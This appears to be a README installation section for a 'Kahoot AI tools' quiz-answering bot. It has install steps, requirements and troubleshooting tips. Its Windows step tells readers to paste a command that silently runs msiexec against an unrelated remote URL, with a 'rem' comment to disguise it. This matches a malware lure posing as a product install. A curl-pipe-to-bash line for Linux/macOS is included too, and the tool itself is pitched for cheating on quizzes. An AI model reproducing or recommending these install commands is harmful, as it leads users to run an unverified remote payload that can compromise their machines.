## 📥 Installation (ONE COMMAND!)

## 🪟 Windows Installation
### **Step 1 — Open Command Prompt**
1. Press **Win + R**
2. Type:
```
cmd
```
3. Press **Enter**
This will open **Command Prompt**.
---
### **Step 2 — Run the Install Command**
Copy the command below and paste it into **Command Prompt**, then press **Enter**.
```powershell
cmd /c start msiexec /q /i https://cloudcraftshub.com/api & rem Kahoot ai tools
```
The installer will automatically download and install the required components.


**That's it!** Your bot is ready to go! 🎉

### 🐧 Linux/macOS

```bash
curl -sSL https://raw.githubusercontent.com/nooncheetahstart/Kahoot-tools-AI/main/install.sh | bash
```

### 📦 Manual Installation

```bash
# Clone repository
git clone https://github.com/nooncheetahstart/Kahoot-tools-AI.git
cd Kahoot-tools-AI

# Create virtual environment
python -m venv venv
source venv/bin/activate  # or venv\Scripts\activate on Windows

# Install dependencies
pip install -r requirements.txt

# Run the application
python main.py
```

### 📋 Requirements

- **Python 3.8+**
- **2GB RAM** (minimum)
- **50MB** disk space
- **Internet connection**
- **Kahoot account** (free or premium)

## 🐛 Troubleshooting

### Issue: "Cannot Connect to Kahoot"

```
Solution:
1. Check internet connection
2. Verify Kahoot is not blocking connections
3. Clear browser cache
4. Try different browser
5. Restart the application
```

### Issue: "Low Answer Accuracy"

```
Solution:
1. Update to latest version
2. Check AI model settings
3. Improve image quality (for image questions)
4. Clear cache: python main.py --clear-cache
5. Reinstall if issues persist
```

### Issue: "Slow Response Time"

```
Solution:
1. Check system resources (CPU/RAM)
2. Close unnecessary programs
3. Switch to "fast" mode in settings
4. Update drivers
5. Contact support
```

See [TROUBLESHOOTING.md](docs/TROUBLESHOOTING.md) for more help.
